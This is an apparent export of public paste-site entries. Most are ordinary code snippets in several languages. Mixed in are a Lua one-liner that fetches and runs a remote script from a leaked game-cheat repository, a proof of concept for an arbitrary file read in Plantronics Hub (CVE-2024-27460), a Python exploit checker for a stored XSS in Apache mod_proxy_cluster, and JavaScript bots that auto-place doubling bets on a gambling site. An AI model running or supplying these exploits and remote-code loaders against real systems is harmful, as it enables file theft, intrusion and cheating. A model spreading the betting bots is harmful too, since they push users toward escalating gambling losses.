id,title,username,language,date,content
e6e9APCB,Untitled,dereksir,Rust,Wednesday 15th of May 2024 09:43:49 AM CDT,"#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // make GET request to target URL and retrieve response
    //...

    // convert HTML to Markdown
    let md = html2md::parse_html(&resp);

    // create a Markdown parser
    let parser = pulldown_cmark::Parser::new(&md);

    // iterate over the events in the parser
    for event in parser {
        match event {
            pulldown_cmark::Event::Text(text) => {
                // check if the text contains the price
                if text.contains(""$"") {
                    println!(""Price: {}"", text);
                }
            },
            _ => {},
        }
    }

    Ok(())
}"
507NJSnU,Character load wait,ohusq,Lua,Wednesday 15th of May 2024 09:32:09 AM CDT,local character = player.Character or player.CharacterAdded:Wait()
pAKrHM7W,WPGlobaCart - Fraktjakt Shipping Method for WooCommerce,nshelper,PHP,Wednesday 15th of May 2024 09:19:14 AM CDT,"function commodities($items) {

    $xml_sub= ""  <commodities>\r\n"";
    foreach ($items as $product) {
        
        do_action( 'woocommerce/cart_loop/start', $product );
    
  		//Check if the product is  virtual. If so, then skip it.
    	$is_virtual = get_post_meta( $product['product_id'], '_virtual', true );
			if ( $is_virtual == 'yes' ) {
                do_action( 'woocommerce/cart_loop/end', $product );
				continue;
			}
      $only_virtual = 'no';  
      $product_id = $product['product_id'];
			$product_instance = wc_get_product($product_id);
				
			// If it's a product variation, get the product_data from the variation field instead.
			$variable_product = new WC_Product_Variation( $product['variation_id'] );
			if ( preg_match( '/^{""id"":0,"".*/', $variable_product ) ) {
        	$product_data = new WC_Product( $product['product_id'] );
			}
			else {
				$product_data = $variable_product;
			}

			$description = get_post_meta( $product_data->get_id(), 'customs_description', true); 
			
			if (empty($description)) {
				$description = $product_data->get_attribute('customs_description');
			}

			if (empty($description)) {
				$terms1 = wc_get_product_terms( $product_id, 'product_brand', array('orderby' => 'term_id', 'order' => 'ASC', 'fields' => 'names') );
				$terms2 = wc_get_product_terms( $product_id, 'pa_brands', array('orderby' => 'term_id', 'order' => 'ASC', 'fields' => 'names')  );
				$terms3 = wc_get_product_terms( $product_id, 'pa_colors', array('orderby' => 'term_id', 'order' => 'ASC', 'fields' => 'names')  );
				$terms4 = wc_get_product_terms( $product_id, 'product_cat', array('orderby' => 'term_id', 'order' => 'ASC', 'fields' => 'names')  );
				$terms5 = wc_get_product_terms( $product_id, 'product_tag', array('orderby' => 'term_id', 'order' => 'ASC', 'fields' => 'names')  );
				$terms = array_merge($terms1, $terms2, $terms3, $terms4, $terms5); 
				$description = implode("", "", $terms);
			}
						
	    if (empty($description)) {
	    	$regular_product_description = $product_instance->get_description();
				$short_product_description = $product_instance->get_short_description();
				$description = ($regular_product_description == '') ? $short_product_description : $regular_product_description;
				$description = ($description == '') ? $product['name'] : $description;
			}									   	

      $description = preg_replace('/[^A-ZÃ…Ã„Ã–a-zÃ¥Ã¤Ã¶0-9\-\,\ ]/', '', $description );

			$hscode = get_post_meta( $product_data->get_id(), 'hscode', true); 
			if (empty($hscode)) {
				$hscode = get_post_meta( $product_data->get_id(), 'taric', true); 
			}
			if (empty($hscode)) {
				$hscode = $product_data->get_attribute('hscode');
				}
			if (empty($hscode)) {
				$hscode = $product_data->get_attribute('taric');
				}
				
			$country = get_post_meta( $product_data->get_id(), 'country', true); 
			if (empty($country)) {
				$country = get_post_meta( $product_data->get_id(), 'Country', true); 
				}
			if (empty($country)) {
				$country = $product_data->get_attribute('country');
				}
			if (empty($country)) {
				$country = $product_data->get_attribute('Country');
				}

	    $fraktjakt_shipping_method_settings = get_option( 'woocommerce_fraktjakt_shipping_method_settings' );

			$fraktjakt_vikt=wc_get_weight( $product_data->get_weight(), 'kg', get_option( 'woocommerce_weight_unit' ) );
	    $dimension_unit = get_option( 'woocommerce_dimension_unit' );


      $xml_sub.= '    <commodity>' . ""\r\n"";
      $xml_sub.= '      <name>'. str_replace(array(""\r"",""\n""), """", strip_tags($product_data->get_name()) ) .'</name>' . ""\r\n"";
      $xml_sub.= '      <quantity>'. $product['quantity'] .'</quantity>' . ""\r\n"";
      $xml_sub.= '      <taric>'. $hscode .'</taric>' . ""\r\n"";
      $xml_sub.= '      <country_of_manufacture>'. $country .'</country_of_manufacture>' . ""\r\n"";
      $xml_sub.= '      <quantity_units>EA</quantity_units>' . ""\r\n"";
      $xml_sub.= '      <description>'. substr(strip_tags($description),0,80) .'</description>' . ""\r\n"";
      $xml_sub.= '      <article_number>'. $product_data->get_sku() .'</article_number>' . ""\r\n"";
      $xml_sub.= '      <unit_price>'.  wc_get_price_to_display($product_data) .'</unit_price>' . ""\r\n"";
		  $xml_sub.= '      <currency>' . (empty($fraktjakt_shipping_method_settings['currency_conversion']) ? 'SEK' : ( $fraktjakt_shipping_method_settings['currency_conversion'] == 'SEK' ? ""SEK"" : ( $fraktjakt_shipping_method_settings['currency_conversion'] == 'EUR' ? ""EUR"" : get_woocommerce_currency() ) )) . '</currency>' . ""\r\n"";

      $xml_sub.= '      <weight>'. ($fraktjakt_vikt * $product['quantity']) .'</weight>' . ""\r\n"";
      $length = $product_data->get_length() ? wc_get_dimension( $product_data->get_length(), 'cm', $dimension_unit ) : '';
			$xml_sub.= '      <length>'.$length.'</length>'.""\r\n"";
      $width = $product_data->get_width() ? wc_get_dimension( $product_data->get_width(), 'cm', $dimension_unit ) : '';
			$xml_sub.= '      <width>'.$width.'</width>'.""\r\n"";
      $height = $product_data->get_height() ? wc_get_dimension( $product_data->get_height(), 'cm', $dimension_unit ) : '';
			$xml_sub.= '      <height>'.$height.'</height>'.""\r\n"";

      $xml_sub.= '    </commodity>' . ""\r\n""; 
      
      do_action( 'woocommerce/cart_loop/end', $product );           
    }
		if ($xml_sub==""  <commodities>\r\n"") {
			return """";
			}
    $xml_sub.= '  </commodities>' . ""\r\n"";
		return $xml_sub;
}"
8ztNkZbi,rayne php,AlphaPenguino,PHP,Wednesday 15th of May 2024 09:18:51 AM CDT,"<?php

function grading() {
    $accumulator = 0;
    for ($i = 0; $i < 7; $i++) {
        $input = getValidGrade($i + 1);
        $accumulator += $input;
    }

    $average = $accumulator / 7;
    echo ""Average Grade: "" . round($average, 2) . ""\n"";

    if ($average >= 98 && $average <= 100) {
        echo ""With Highest Honor\n"";
    } elseif ($average >= 95 && $average < 98) {
        echo ""With High Honors\n"";
    } elseif ($average >= 90 && $average < 95) {
        echo ""With Honors\n"";
    } elseif ($average >= 75 && $average < 90) {
        echo ""Passed\n"";
    } elseif ($average >= 51 && $average < 75) {
        echo ""Failed\n"";
    }

    echo ""Continue? (Y/N)\n"";
}

function getValidGrade($subjectNumber) {
    while (true) {
        echo ""Enter grade for Subject $subjectNumber: "";
        $input = readline();
        if (is_numeric($input) && $input >= 0 && $input <= 100) {
            return (float)$input;
        } else {
            echo ""Enter a valid number between 0 and 100!\n"";
        }
    }
}
grading();
while (true) {
    
    $input = readline();
    switch (strtolower($input)) {
        case 'no':
        case 'n':
            break 2;
        case 'yes':
        case 'y':
            grading();
            break;
        default:
            echo ""Please respond with YES, Yes, yes or NO, No, no (or Y, y or N, n)\n"";
            break;
    }
}

?>"
jNidPNMw,login2024,SeaLion69,Lua,Wednesday 15th of May 2024 09:11:23 AM CDT,"【App】LoginApp【App】
【Ver】1150.0【Ver】
【Data】{
        [1] = {
            [Name] = ""nn"",
            [Pass] = ""pp"",
            [Rank] = ""Admin"",
            [Exp] = ""01022024""
        },
        [2] = {
            [Name] = ""nn"",
            [Pass] = ""pp"",
            [Rank] = ""Free"",
            [Exp] = ""01022024""
        },
        [3] = {
            [Name] = ""nn"",
            [Pass] = ""pp"",
            [Rank] = ""Vip"",
            [Exp] = ""01022024""
        },
        [4] = {
            [Name] = ""nn"",
            [Pass] = ""pp"",
            [Rank] = ""SuperVip"",
            [Exp] = ""01022024""
        }
    }【Data】"
rpBtfEaT,grading system php,AlphaPenguino,PHP,Wednesday 15th of May 2024 08:49:16 AM CDT,"<?php

function grading() {
    $accumulator = 0;
    for($i=0;$i<7;$i++){
        echo ""Enter grade: "";
        $input = readline();
        if ($input>100 || $input<0) {
            echo ""enter valid number! \n"";
            $i-=1;
        }
        else {
            echo ""Subject "" . ($i+1) . "": "" . $input . ""\n"";
            $accumulator+=$input;  
        }
        
    }
    
    $average = $accumulator/7;
    
    echo ""Average Grade: "" . round($average, 2) . ""\n"";
    
    
    if ($average>=98 && $average<=100) {
        echo ""With Highest Honor\n"";
    }
    elseif ($average>=95 && $average<98) {
        echo ""With High Honors\n"";
    }
    elseif ($average>=90 && $average<95) {
        echo ""With Honors\n"";
    }
    elseif ($average>=75 && $average<90) {
        echo ""Passed\n"";
    }
    elseif ($average>=51 && $average<75) {
        echo ""Failed\n"";
    }
    echo ""Continue?\n"";
}
grading();
while(true){
    
    $input = readline();
   switch (strtolower($input)) {
       case 'no':
       case 'n':
           
           break 2;
       case 'yes':
       case 'y':
           grading();
           break;
        default:
            echo ""Respond with either YES,Yes,yes or NO,No,no (or Y, y or N,n)\n"";
            break;
   }

}

?>"
vq35Lcpa,Legit Script,Bacon_Script,Lua,Wednesday 15th of May 2024 08:34:25 AM CDT,"loadstring(game:HttpGet('https://raw.githubusercontent.com/Ps99-leakscript/Legitimately-Petsim99/main/message%20(1).txt'))()
"
LE0wnbEy,Plantronics Hub 3.25.1 - Arbitrary File Read - CVE-2024-27460,FlyFar,Email,Wednesday 15th of May 2024 08:30:44 AM CDT,"# Exploit Title: Plantronics Hub 3.25.1 – Arbitrary File Read
# Date: 2024-05-10
# Exploit Author: Farid Zerrouk from Deloitte Belgium, Alaa Kachouh from
Mastercard
# Vendor Homepage:
https://support.hp.com/us-en/document/ish_9869257-9869285-16/hpsbpy03895
# Version: Plantronics Hub for Windows version 3.25.1
# Tested on: Windows 10/11
# CVE : CVE-2024-27460

As a regular user drop a file called ""MajorUpgrade.config"" inside the
""C:\ProgramData\Plantronics\Spokes3G"" directory. The content of
MajorUpgrade.config should look like the following one liner:
^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config

Exchange <FULL-PATH-TO-YOUR-DESIRED-FILE> with a desired file to read/copy
(any file on the system). The desired file will be copied into C:\Program
Files (x86)\Plantronics\Spokes3G\UpdateServiceTemp

Steps to reproduce (POC):
- Open cmd.exe
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo ^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
- Desired file will be copied into C:\Program Files
(x86)\Plantronics\Spokes3G\UpdateServiceTemp
            "
BzJBXrTs,Delete Node in a BST,jayati,C++,Wednesday 15th of May 2024 08:30:35 AM CDT,"/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode() : val(0), left(nullptr), right(nullptr) {}
 *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}
 *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}
 * };
 */
class Solution {
public:
 
TreeNode* maxValue(TreeNode*root){
    if(root==NULL){
        return 0;
    }
    TreeNode*temp =root;
    while(temp->right!=NULL){
        temp= temp->right;
    }
    return temp;
}
    TreeNode* deleteNode(TreeNode* root, int key) {
        if(root==NULL)
            return root;
        
        if(root->val ==key){
            // for 0 child
            if(root->left==NULL && root->right ==NULL){
                delete root;
                return NULL;
            }
            // for 1 child
            if(root->left!=NULL && root->right ==NULL){
                TreeNode*temp = root->left;
                delete root;
                return temp;
            }
             if(root->left==NULL && root->right !=NULL){
                TreeNode*temp = root->right;
                delete root;
                return temp;
            }
            // for 2 child
            if(root->left!=NULL && root->right!=NULL){
            int maxi = maxValue(root->left)->val;
              root->val = maxi;
              root->left =deleteNode(root->left,maxi);
              return root;
            }
        }
        else if(root->val >key){
            root->left= deleteNode(root->left,key);
            return root;
        }
        else{
            root->right = deleteNode(root->right,key);
            return root;
        }
        return root;
    }
};"
zt0hNz7g,Apache mod_proxy_cluster - Stored XSS,FlyFar,Python,Wednesday 15th of May 2024 08:29:38 AM CDT,"import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from requests.exceptions import RequestException

class Colors:
    RED = '\033[91m'
    GREEN = '\033[1;49;92m'
    RESET = '\033[0m'

def get_cluster_manager_url(base_url, path):
    print(Colors.GREEN + f""Preparing the groundwork for the exploitation on {base_url}..."" + Colors.RESET)
    try:
        response = requests.get(base_url + path)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(Colors.RED + f""Error: {e}"" + Colors.RESET)
        return None

    print(Colors.GREEN + f""Starting exploit check on {base_url}..."" + Colors.RESET)

    if response.status_code == 200:
        print(Colors.GREEN + f""Check executed successfully on {base_url}..."" + Colors.RESET)
        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all 'a' tags with 'href' attribute
        all_links = soup.find_all('a', href=True)

        # Search for the link containing the Alias parameter in the href attribute
        cluster_manager_url = None
        for link in all_links:
            parsed_url = urlparse(link['href'])
            query_params = parse_qs(parsed_url.query)
            alias_value = query_params.get('Alias', [None])[0]

            if alias_value:
                print(Colors.GREEN + f""Alias value found"" + Colors.RESET)
                cluster_manager_url = link['href']
                break

        if cluster_manager_url:
            print(Colors.GREEN + f""Preparing the injection on {base_url}..."" + Colors.RESET)
            return cluster_manager_url
        else:
            print(Colors.RED + f""Error: Alias value not found on {base_url}..."" + Colors.RESET)
            return None

    print(Colors.RED + f""Error: Unable to get the initial step on {base_url}"")
    return None

def update_alias_value(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)
    query_params['Alias'] = [""<DedSec-47>""]
    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))
    print(Colors.GREEN + f""Injection executed successfully on {updated_url}"" + Colors.RESET)
    return updated_url

def check_response_for_value(url, check_value):
    response = requests.get(url)
    if check_value in response.text:
        print(Colors.RED + ""Website is vulnerable POC by :"")
        print(Colors.GREEN + """"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """""")
    else:
        print(Colors.GREEN + ""Website is not vulnerable POC by :"")
        print(Colors.GREEN + """"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """""")

def main():
    # Create a command-line argument parser
    parser = argparse.ArgumentParser(description=""python CVE-2023-6710.py -t https://example.com -u /cluster-manager"")

    # Add a command-line argument for the target (-t/--target)
    parser.add_argument('-t', '--target', help='Target domain (e.g., https://example.com)', required=True)

    # Add a command-line argument for the URL path (-u/--url)
    parser.add_argument('-u', '--url', help='URL path (e.g., /cluster-manager)', required=True)

    # Parse the command-line arguments
    args = parser.parse_args()

    # Get the cluster manager URL from the specified website
    cluster_manager_url = get_cluster_manager_url(args.target, args.url)

    # Check if the cluster manager URL is found
    if cluster_manager_url:
        # Modify the URL by adding the cluster manager value
        modified_url = args.target + cluster_manager_url
        modified_url = update_alias_value(args.target + cluster_manager_url)
        print(Colors.GREEN + ""Check executed successfully"" + Colors.RESET)

        # Check the response for the value ""<DedSec-47>""
        check_response_for_value(modified_url, ""<DedSec-47>"")

if __name__ == ""__main__"":
    main()
            "
CDWp91aw,Color to Texture,czeak6464,Python,Wednesday 15th of May 2024 08:24:15 AM CDT,"import bpy

# Make sure you model has been UV unwrapped 

# Set the render engine to Cycles
bpy.context.scene.render.engine = 'CYCLES'

# Create a new image to bake to
image_name = ""BakedTexture""
image = bpy.data.images.new(image_name, width=1024, height=1024)

# Iterate through all materials and assign the new image
for mat in bpy.data.materials:
    if mat.use_nodes:
        for node in mat.node_tree.nodes:
            if node.type == 'BSDF_PRINCIPLED':
                # Create an Image Texture node and assign the new image
                image_node = mat.node_tree.nodes.new('ShaderNodeTexImage')
                image_node.image = image
                mat.node_tree.nodes.active = image_node

# Bake the base colors
bpy.ops.object.bake(type='DIFFUSE', pass_filter={'COLOR'})

# Save the baked image
image.filepath_raw = ""//baked_texture.png""
image.file_format = 'PNG'
image.save()"
W9pbMkun,supersnowzy strikes back snowybot robo manual,coinwalk,JavaScript,Wednesday 15th of May 2024 08:09:44 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/24).toPrecision(2));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24)
var snowy = 0;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great!=snowy)){
    beast = beast*2;
    snowy = parseFloat(great);
}
if (((great/3.9)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.9)<=beast)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.9)<=beast)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
}
if ((beast>=elderly)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
}
if ((beast>=elderly)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
}
if ((beast>=elderly)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
H1xpzAB6,Game_if_else,cuniszkiewicz,C#,Wednesday 15th of May 2024 08:04:03 AM CDT,"using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Game
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int userNumber;
            char decision;
            Random rand = new Random(DateTime.Now.Millisecond);
        newGame:
            Console.Clear();
            int winNumber = Convert.ToInt32(rand.Next(1, 11));//randomized number from rande 1-10
            int chances = 3;
            
            Console.WriteLine($""Win number: {winNumber}"");
            
        userNum:
            
            Console.Write(""Put a number from range 1-10: "");
            userNumber = int.Parse(Console.ReadLine());

            if (userNumber == winNumber)
            {
                Console.Clear();
                Console.WriteLine(""\n\n\n\n\n\n\n\t\t\t\t\t\t\tYou won!"");
            }
            else
            {
                chances--; // chances = chances - 1;
                if (chances != 0)
                {
                    Console.WriteLine(""Try again!"");
                    goto userNum;
                }
                else
                {
                    Console.Clear();
                    Console.WriteLine(""\n\n\n\n\n\n\n\t\t\t\t\t\t\tGame over!"");  
                }
            }
            
            Console.Write(""Do you want to play again? y - yes: "");
            decision = char.Parse(Console.ReadLine());
            if (decision == 'y')
                goto newGame;
            else
            {
                Console.Clear();
                Console.WriteLine(""\n\n\n\n\n\n\n\t\t\t\t\t\t\tThank you!"");
                System.Threading.Thread.Sleep(1000);
            }
        }
    }
}

"
G2X0Fgc2,snowybot robo manual,coinwalk,JavaScript,Wednesday 15th of May 2024 07:52:20 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var olderest = elderly;
var prefit = Number((olderest/24).toFixed(6));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var stock = (prefit*24);
var chickendinner = (olderest*3);
var winnerdinner = (elderly*24)
var original = olderest;
var snowy = 0;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great!=snowy)){
    beast = beast*2;
    snowy = parseFloat(great);
}
if (((great/3.5)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.5)<=beast)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.5)<=beast)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
}
if (great>=chickendinner){
olderest = parseFloat(great);
prefit = Number((olderest/24).toFixed(6));
beast = prefit;
tens = (prefit*10);
sevens = (prefit*6.9);
eights = (prefit*7.9);
flyt = 6.9;
doner = 2.9;
snowy = ((Math.floor(great/tens))*tens);
chickendinner = (olderest*3);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
kQUwUQ8h,snowybot robo manual,coinwalk,JavaScript,Wednesday 15th of May 2024 07:50:47 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var olderest = elderly;
var prefit = Number((olderest/24).toFixed(6));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var stock = (prefit*24);
var chickendinner = (olderest*3);
var winnerdinner = (elderly*24)
var original = olderest;
var snowy = 0;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-olderest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great!=snowy)){
    beast = beast*2;
    snowy = parseFloat(great);
}
if (((great/3.5)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.5)<=beast)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
}
if (((great/3.5)<=beast)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
}
if (great>=chickendinner){
olderest = parseFloat(great);
prefit = Number((olderest/24).toFixed(6));
beast = prefit;
tens = (prefit*10);
sevens = (prefit*6.9);
eights = (prefit*7.9);
flyt = 6.9;
doner = 2.9;
snowy = ((Math.floor(great/tens))*tens);
chickendinner = (olderest*3);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
dCN2LjHp,decimal_roman_php,AlphaPenguino,PHP,Wednesday 15th of May 2024 07:46:35 AM CDT,"<?php

$input = readline();

function decimal_roman($num) {
    
    $output = """";
    $roman_value = array(""M""=>1000, 
                        ""CM""=>900,
                        ""D""=>500,
                        ""CD""=>400,
                        ""C""=>100,
                        ""XC""=>90,
                        ""L""=>50,
                        ""LX""=>40,
                        ""X""=>10,
                        ""IX""=>9,
                        ""V""=>5,
                        ""IV""=>4,
                        ""I""=>1
                        );
    
    foreach ($roman_value as $key => $value) {
        while($num>=$value) {
            $output .= $key;
            $num -= $value;
        } 
    }
    return $output;
}
echo decimal_roman($input);


?>"
dFUM1U7D,MainScript 5 (STORY GAME),Sungmingamerpro13,CSS,Wednesday 15th of May 2024 07:44:53 AM CDT,"local DialogueEvent = game.ReplicatedStorage.Remotes.DialogueEvent
local HideDialogueEvent = game.ReplicatedStorage.Remotes.HideDialogueEvent
local TopTextValue = game.ReplicatedStorage.TopText
local ObjectiveValue = game.ReplicatedStorage.TopText.Objective
local ItemsFound = game.ReplicatedStorage.ItemsFound

local randomPlayer

function BroadCastMessage(character, Text)
	DialogueEvent:FireAllClients(character, Text)
end

function HideCastMessage()
	HideDialogueEvent:FireAllClients()
end

function TopText(Text, Time)
	for i = Time, 0, -1 do
		TopTextValue.Value = Text..""(""..i.."")""
		wait(1)
	end
	TopTextValue.Value = ""None""
end

function SetObjectives(Objective)
	ObjectiveValue.Value = Objective
end

function ClearObjectives()
	ObjectiveValue.Value = ""None""
end

function SetItemsFound(Text)
	ItemsFound.Value = Text
end

function ClearItemsFound()
	ItemsFound.Value = ""None""
end

function ChooseRandomPlayer()
	return game.Players:GetChildren()[math.random(1, #game.Players:GetChildren())]
end

function MoveNPC(NPCName, Location)
	local NPC = workspace[NPCName]
	NPC.Humanoid:MoveTo(Location.Position)
	NPC.Humanoid.MoveToFinished:Wait()
end

function FaceNPC(NPCName, FaceID)
	local NPC = workspace[NPCName]
	NPC.Head.face.Texture = ""rbxassetid://""..FaceID
end

function TransitionScreen()
	for _, player in pairs(game.Players:GetPlayers()) do
		spawn(function()
			local NewGui = game.ServerStorage.Assets.TransitionScreen:Clone()
			NewGui.Parent = player.PlayerGui
		end)
	end
end

---- NPC Face ----

local Happy = ""20722053""
local Angry = ""14163753887""
local Sad = ""17156406277""
local Scared = ""4468478419""
local Crying = ""7217996242""

---- NPC ----

local NPC = workspace[""Sungmin""]

---- MainScript ----"
pctg06WL,ДЗ: Сортировка чисел,TeT91,C#,Wednesday 15th of May 2024 07:39:46 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int minValue = 0;
            int maxValue = 10;

            int[] numbers = new int[10];

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(minValue, maxValue + 1);
            }

            Console.WriteLine(""Числа в массиве:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            for (int i = 0; i < numbers.Length-1; i++)
            {
                int tempNumber;

                if (numbers[i] > numbers[i + 1])
                {
                    tempNumber = numbers[i];
                    numbers[i] = numbers[i + 1];
                    numbers[i + 1] = tempNumber;
                    i = -1;
                }
            }

            Console.WriteLine(""\nОтсортированный массив:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.ReadKey();
        }
    }
}"
rrFa64vi,Untitled,nonamer25,autoconf,Wednesday 15th of May 2024 07:38:10 AM CDT,"# Config file for Dosbox-ECE r4230
[sdl]
fullscreen=false
fulldouble=false
fullresolution=0x0
windowresolution=1280x960
output=overlay
mapperfile=mapper.map
usescancodes=false
[dosbox]
machine=svga_s3
memsize=63
[render]
aspect=true
scaler=normal2x
[cpu]
core=auto
cputype=auto
cycles=max
[pci]
[mixer]
prebuffer=20
[midi]
mididevice=mt32
fluid.soundfont=.\mt32\SoundCanvas.sf2
mt32.romdir=.\mt32
[sblaster]
[gus]
[speaker]
disney=false
[joystick]
[serial]
[dos]
[ipx]

[autoexec]
@mount c C:\Users\\Downloads\Nitro_Racers_1997\NitroRac
imgmount d C:\Users\\Downloads\Nitro_Racers_1997\NitroRac\CD\NITRO.cue -t cdrom
c:
cd nitro
@echo off
cls
nitro
exit


"
